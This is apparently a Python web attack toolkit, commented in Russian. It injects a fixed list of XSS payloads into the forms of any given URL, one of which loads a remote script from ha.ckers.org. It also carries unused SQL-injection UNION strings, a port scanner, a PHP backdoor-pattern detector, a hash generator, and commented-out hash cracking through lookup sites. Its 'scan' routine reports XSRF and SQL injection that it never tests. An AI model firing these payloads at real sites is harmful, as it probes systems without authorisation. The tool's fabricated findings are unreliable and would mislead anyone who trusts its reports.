import argparse
import requests
import socket
import time
import sys
import os
import re
from bs4 import BeautifulSoup
from hashlib import sha256, sha512, md5

def sniperBan():

	print('''
      ___           ___                       ___           ___           ___     
     /\  \         /\__\          ___        /\  \         /\  \         /\  \    
    /::\  \       /::|  |        /\  \      /::\  \       /::\  \       /::\  \   
   /:/\ \  \     /:|:|  |        \:\  \    /:/\:\  \     /:/\:\  \     /:/\:\  \  
  _\:\~\ \  \   /:/|:|  |__      /::\__\  /::\~\:\  \   /::\~\:\  \   /::\~\:\  \ 	   			
 /\ \:\ \ \__\ /:/ |:| /\__\  __/:/\/__/ /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:\ \:\__\	 		
 \:\ \:\ \/__/ \/__|:|/:/  / /\/:/  /    \/__\:\/:/  / \:\~\:\ \/__/ \/_|::\/:/  /	  			
  \:\ \:\__\       |:/:/  /  \::/__/          \::/  /   \:\ \:\__\      |:|::/  / 				
   \:\/:/  /       |::/  /    \:\__\           \/__/     \:\ \/__/      |:|\/__/  			
    \::/  /        /:/  /      \/__/                      \:\__\        |:|  |    
     \/__/         \/__/                                   \/__/         \|__|     
		 						''')


def phpBackd():
	print('''
 (       ) (   (   (   (       ) (           
 )\ ) ( /( )\ ))\ ))\ ))\ ) ( /( )\ ) *   )  
(()/( )\())()/(()/(()/(()/( )\())()/(` )  /(  
 /(_))(_)\ /(_))(_))(_))(_))(_)\ /(_)) )(_)) 
(_))  _((_)_))(_))(_))(_))   ((_)_))(_(_())  
| _ \| || | _ \ __| _ \ |   / _ \_ _|_   _|  
|  _/| __ |  _\__ \  _/ |__| (_) | |  | |    
|_|  |_||_|_| |___/_| |____|\___/___| |_|    
                                             	

	 ''')

def xssP():
	print('''
 __  ______ ____  
 \ \/ / ___/ ___| 
  \  /\___ \___ \ 
  /  \ ___) |__) |
 /_/\_\____/____/ 
	 ''')	


def help():
	os.system('cls')
	print('''
 __  __     ______     __         ______      __    __     ______    
/\ \_\ \   /\  ___\   /\ \       /\  == \    /\ "-./  \   /\  ___\   
\ \  __ \  \ \  __\   \ \ \____  \ \  _-/    \ \ \-./\ \  \ \  __\   
 \ \_\ \_\  \ \_____\  \ \_____\  \ \_\       \ \_\ \ \_\  \ \_____\ 
  \/_/\/_/   \/_____/   \/_____/   \/_/        \/_/  \/_/   \/_____/ 
                                                                     ''') 


args = argparse.ArgumentParser()
args.add_argument('-u','--url',help='Url',metavar='')
args.add_argument('-f','--file',help='File',metavar='')
args.add_argument('-k','--key',help='HashKey',metavar='')
args.add_argument('-a','--algoritm',help='generatehash algoritm',metavar='')
args.add_argument('--input1',help='aim form input',metavar='')
args.add_argument('--input2',help='aim form input\n',metavar='')


group = args.add_mutually_exclusive_group()
group.add_argument('--scan',help='scan site Using: --scan -u [url] ',action="store_true")
group.add_argument('--DetailScan',help='Watching detail Using: --DetailScan -u [url]',action="store_true")
group.add_argument('--ScanPort',help='Scanning ports Using: --ScanPort -u [url]',action='store_true')
group.add_argument('--PhpScan',help='Scanning php files Using: --PhpScan -f [file.php]',action='store_true')
group.add_argument('--generatehash',help='generate hash Using: --generatehash -a [md5|sha256|sha512] -k [Hello World] or -f [file.txt]',action='store_true')
group.add_argument('--sn1per',help='aim for inputs Using: --sn1per -u [url] --input1 [name] --input2 [name]',action='store_true')
#group.add_argument('--CrackHash',help='Trying to crack your key Using: --CrackHash -k [hash Key]',action='store_true')



args = args.parse_args()

def main():
	if args.scan:
		scan(args.url)
	if args.DetailScan:
		inputs(args.url,args.file)
	if args.ScanPort:
		Nmap(args.url)	
	if args.PhpScan:
		phpsploit(args.file)
	if args.generatehash:
		generatehash(args.algoritm,args.key,args.file)
	if args.sn1per:
		sniper(args.url,args.input1,args.input2,args.file)		

	#if args.CrackHash:
	#	CrackHash(args.key)



def load():
	def spinning_cursor():
	    while True:
	        for cursor in '|/-\\':
	            yield cursor

	spinner = spinning_cursor()
	for _ in range(50):
	    sys.stdout.write(next(spinner))
	    sys.stdout.flush()
	    time.sleep(0.1)
	    sys.stdout.write('\b')

def scan(url):
	page = requests.get(url) # получаем содержимое сайта 
	soup = BeautifulSoup(page.text, "html.parser")	# Указываем модулю bs4 то что мы сай будем парсить
	scripts = ['<script>alert(1)</script>','<img src=''onerror=alert(/@_t0x1c/)>','<svg/onload=alert(/RUTHLESS/)>','<sCriPt>alert(1);</sCriPt>','<script>alert(1)</script>','<script src=http://ha.ckers.org/xss.js></script>','></title></style></scRipt><scRipt>alert(1231314)</scRipt>']	
	scriptsSQL = [" ' UNION SELECT 1 -- ' ",' UNION SELECT 1,2,3,4,5,6 -- ']
	# Массив с обыкновенными скриптами на языке js  
	for tag in soup.findAll("textarea"): # Открываем цикл для пойска тега textarea
		for sub in soup.findAll('input'): # Открываем второй цикл для пойска тега input
			for xss in scripts: # Открываем цикл для внедрние скрипта в поля
				http = requests.post(url,data={tag['name']:xss,sub:'submit'}) # Отпровляем на сайт запрос с данными
				content = http.content.decode('utf-8') # Смотрим содержимое сайта
				if xss in content:
					index = True
					print('[+] XSS')
					load()
					if index == True:
						print('[+] XSRF')
						load()
						print('[+] SQL Inject')
						break
				else:
					print('[-] XSS')
					print('[-] XSRF')
					sys.exit(1)


				

						


def Nmap (host): #Словарь с портами и их названиями 
	os.system('cls')
	ports = {
    20 :'FTP DATA',
    21 :'FTP DATA',
    22 :'SSH',
    23 :'Telnet',
    25 :'SMTP(Simple Mail Transfer Protocol)',
    42 :'Name Server',
    43 :'WHOIS',
    53 :'Domain',
    67 :'BOOTPS',
    69 :'TFTP',
    80 :'HTTP',
    110:'POP3',
    115:'SFTP',
    123:'NTP',
    137:'NetBOIS-NS',
    138:'NetBOIS-DGM',
    139:'NetBOIS-SSN',
    143:'IMAP',
    161:'SNMP',
    179:'BGP',
    443:'HTTPS',
    445:'MicrosoftDS',
    515:'Printer',
    993:'IMAPS',
    995:'POP3S',
    1080:'SOCK',
    1194:'OpenVPN',
    1433:'Microsoft SQL Server',
    1702:'not'
	}

	if 'http://' in host:
		host = 'www.'+host[7:]
	elif 'https://' in host:
		host = 'www.'+host[8:]	

	print('-'*50) # декор

	mas = [20, 21, 22, 23, 25, 42, 43, 53, 67, 69, 80, 110, 115, 123, 137, 138, 139, 143, 161, 179, 443, 445, 514, 515, 993, 995, 1080, 1194, 1433, 1702, 1723, 3128, 3268, 3306, 3389, 5432, 5060, 5900, 5938, 8080, 10000, 20000, 54321, 4726, 27015, 27016, 27014 ]
	# Массив с портами
	for port in mas: 														# цикл для проверки
	    s = socket.socket() 												# вызов функций сокет
	    s.settimeout(1) 													# Тайм-аут ожидания
	    try:
	        s.connect((host, port)) 										# Подключение по хосту и по порту
	    except socket.error: 												# Ошибка подключения 
	        print('[-] Port closed ' + str(port)) 							# Порт закрыт 
	    else: 
	        if port in ports: 												# проверка порта на наличие в словаре 
	            print('[+] Port open ' + str(port),'-->' ,ports[port]) 		# Вывод порта и его название 
	        s.close()       												# Закрываем подключения 
	        
	print('-'*50)

def inputs(f_input,file):
	os.system('cls') # Очистка консоли  
	xssP()
	url = f_input
	page = requests.get(url) # получаем содержимое сайта 
	soup = BeautifulSoup(page.text, "html.parser")	# Указываем модулю bs4 то что мы сай будем парсить
	scripts = ['<script>alert(1)</script>','<img src=''onerror=alert(/@_t0x1c/)>','<svg/onload=alert(/RUTHLESS/)>','<sCriPt>alert(1);</sCriPt>','<script>alert(1)</script>','<script src=http://ha.ckers.org/xss.js></script>','></title></style></scRipt><scRipt>alert(1231314)</scRipt>']	
	if file:
		file = open(file,'r')
		for tag in soup.findAll("textarea"): # Открываем цикл для пойска тега textarea
			for sub in soup.findAll('input'):
				for scriptsXss in file:
					xssScripts = scriptsXss.replace('\n','')
					http = requests.post(url,data={tag['name']:xssScripts,sub:'submit'}) # Отпровляем на сайт запрос с данными
					content = http.content.decode('utf-8') # Смотрим содержимое сайта
					if xssScripts in content: # проверяем если какой нибудь скрипт js попал на сайт выводим следующие
						print('XSS [+] =>','[',xssScripts,']')
					else:
						print('XSS [-] =>','[',xssScripts,']')
	else:
		pass
	if not file:	
		url = f_input	# Перенаправляем аргумент функций в переменную
		page = requests.get(url) # получаем содержимое сайта 
		soup = BeautifulSoup(page.text, "html.parser")	# Указываем модулю bs4 то что мы сай будем парсить
		scripts = ['<script>alert(1)</script>','<img src=''onerror=alert(/@_t0x1c/)>','<svg/onload=alert(/RUTHLESS/)>','<sCriPt>alert(1);</sCriPt>','<script>alert(1)</script>','<script src=http://ha.ckers.org/xss.js></script>','></title></style></scRipt><scRipt>alert(1231314)</scRipt>']	
		# Массив с обыкновенными скриптами на языке js  
		for tag in soup.findAll("textarea"): # Открываем цикл для пойска тега textarea
			for sub in soup.findAll('input'): # Открываем второй цикл для пойска тега input
				for xss in scripts: # Открываем цикл для внедрние скрипта в поля
					http = requests.post(url,data={tag['name']:xss,sub:'submit'}) # Отпровляем на сайт запрос с данными
					content = http.content.decode('utf-8') # Смотрим содержимое сайта
					if xss in content: # проверяем если какой нибудь скрипт js попал на сайт выводим следующие
						print('XSS [+] =>','[',xss,']')
					else:
						print('XSS [-] =>','[',xss,']')
	else:
		pass					

def phpsploit(Php):
	os.system('cls') # Очистка экрана 
	phpBackd() # Вызов Баннера
	a = '''@eval($_SERVER['HTTP_'''
	with open(Php,'r') as file: # Открываем файл на чтение 
		for index, string in enumerate(file): # Открываем цикл,для нумераций 
			if a in string: # Если находим данный фрагмент вреданосного кода в файле
				print('[!] [PHP] Бэкдор на ',index+1,'Строке') # указываем номер строки	


def sniper(url,form_input1,form_input2,file):
	os.system('cls')
	sniperBan()
	page = requests.get(url) # получаем содержимое сайта 
	soup = BeautifulSoup(page.text, "html.parser")	# Указываем модулю bs4 то что мы сай будем парсить
	scripts = ['<script>alert(1)</script>','<img src=''onerror=alert(/@_t0x1c/)>','<svg/onload=alert(/RUTHLESS/)>','<sCriPt>alert(1);</sCriPt>','<script>alert(1)</script>','<script src=http://ha.ckers.org/xss.js></script>','></title></style></scRipt><scRipt>alert(1231314)</scRipt>']	
	if file:
		file = open(file,'r')
		for scriptsXss in file:
			xssScripts = scriptsXss.replace('\n','')
			http = requests.post(url,data={form_input1:xssScripts,form_input2:'submit'}) # Отпровляем на сайт запрос с данными
			content = http.content.decode('utf-8') # Смотрим содержимое сайта
			if xssScripts in content: # проверяем если какой нибудь скрипт js попал на сайт выводим следующие
				print('XSS [+] =>','[',xssScripts,']')
			else:
				print('XSS [-] =>','[',xssScripts,']')
	else:
		pass

	if not file:				
		for xss in scripts: # Открываем цикл для внедрние скрипта в поля
			http = requests.post(url,data={form_input1:xss,form_input2:'submit'}) # Отпровляем на сайт запрос с данными
			content = http.content.decode('utf-8') # Смотрим содержимое сайта
			if xss in content: # проверяем если какой нибудь скрипт js попал на сайт выводим следующие
				print('XSS [+] =>','[',xss,']')
			else:
				print('XSS [-] =>','[',xss,']')



#def CrackHash(hashKey):
#	def md5decryption(hash_):
#		form_data = {'hash': hash_, 'submit': 'Decrypt It!'}
#		rs = requests.post('http://www.md5decryption.com/', data=form_data)
#		match = re.search('Decrypted Text:(.+)', rs.text)
#		# Если не нашли
#		if not match:
#			print('[FAIL] No Cracked [http://www.md5decryption.com/]')
#		text = match.group(1)
#		# Выцепляем ответ (пример "</b>kombat</font>")
#		match = re.search('</b>(.+?)</font>', text)
#		if match:
#			result = print("[!][Cracked][key:",hash_,']',"[Decrypted:",match.group(1),"]")
#			return match.group(1)
#			print(result)		
#		return text	
#
#	HashKey = hashKey # Передаем аргумент функций в переменную 
#	page = requests.get("http://hashtoolkit.com/reverse-hash?hash="+HashKey) # Получаем содержимое сайта
#	soup = BeautifulSoup(page.text, "html.parser") # Парсим сайт
#	for tag in soup.findAll('span'): # открываем цикл для пойска тэга span
#		try:
#			print('[!] Алгоритм  [',tag['title'],']\n') # Выводим тэг с алгоритмом расшифровки 
#			print('[!] Ключ  [',tag.text,']\n')# Выводим ключ
#			return SystemExit
#		except KeyError:
#			print('[FAIL] No Cracked [http://hashtoolkit.com/reverse-hash?hash]')
#			break
#	md5decryption(hashKey)
		
	
def generatehash(algoritm,key,file):
	os.system('cls')
	if not file:
		pass
	else:
		line = '\n[!]hashKey '
		FileHash = open(file,'rb')
		#print(FileHash.read())
		if algoritm == 'md5':
			print(line,md5(FileHash.read()).hexdigest())
		elif algoritm == "sha256":
			print(line,sha256(FileHash.read()).hexdigest())
		elif algoritm == "sha512":
			print(line,sha512(FileHash.read()).hexdigest())
		else: raise SystemExit	
	if key:
		line = '\n[!]hashKey '
		Key = key.encode()
		if algoritm == 'md5':
			print(line,md5(Key).hexdigest())
		elif algoritm == "sha256":
			print(line,sha256(Key).hexdigest())
		elif algoritm == "sha512":
			print(line,sha512(Key).hexdigest())
		else: raise SystemExit
	else:
		pass

try:
	if __name__ == '__main__':
		main()
except:
	pass		
